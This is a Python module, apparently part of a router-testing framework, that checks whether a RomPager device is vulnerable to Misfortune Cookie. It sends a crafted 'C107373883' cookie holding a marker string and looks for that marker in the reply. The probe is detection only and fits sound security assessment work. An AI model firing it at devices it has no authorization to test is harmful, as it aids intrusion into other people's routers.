# Name:Misfortune Cookie vulnerability scanner
# File:misfortune_cookie.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 4.2.2014
# Last modified: 19.8.2015
# Shodan Dork:
# Description: PoC based on 31C3 presentation

import core.Scanner
from interface.messages import print_failed, print_success, print_warning, print_error

import requests
import requests.exceptions
import re


class Scanner(core.Scanner.RextScanner):
    """
Name:Misfortune Cookie vulnerability scanner
File:misfortune_cookie.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 4.2.2014
Description: PoC based on 31C3 presentation, tries to exploit Misfortune cookie vulnerability with string omg1337hax

Options:
    Name        Description

    host        Target host address
    port        Target port
    """
    def __init__(self):
        core.Scanner.RextScanner.__init__(self)

    def do_run(self, e):
        user_agent = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'
        headers = {'User-Agent': user_agent,
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-language': 'sk,cs;q=0.8,en-US;q=0.5,en;q,0.3',
                   'Connection': 'keep-alive',
                   'Accept-Encoding': 'gzip, deflate',
                   'Cache-Control': 'no-cache',
                   'Cookie': 'C107373883=/omg1337hax'}
        target = 'http://' + self.host + ":" + self.port + '/blabla'
        try:
            response = requests.get(target, headers=headers, timeout=60)
            if response.status_code != 404:
                print_failed("Unexpected HTTP status, expecting 404 got: %d" % response.status_code)
                print_warning("Device is not running RomPager")
            else:
                if 'server' in response.headers:
                    server = response.headers.get('server')
                    if re.search('RomPager', server) is not None:
                        print_success("Got RomPager! Server:%s" % server)
                        if re.search('omg1337hax', response.text) is not None:
                            print_success("device is vulnerable to misfortune cookie")
                        else:
                            print_failed("test didn't pass.")
                            print_warning("Device MAY still be vulnerable")
                    else:
                        print_failed("RomPager not detected, device is running: %s " % server)
                else:
                    print_failed("Not running RomPager")
        except requests.exceptions.Timeout:
            print_error("Timeout!")
        except requests.exceptions.ConnectionError:
            print_error("No route to host")

Scanner()
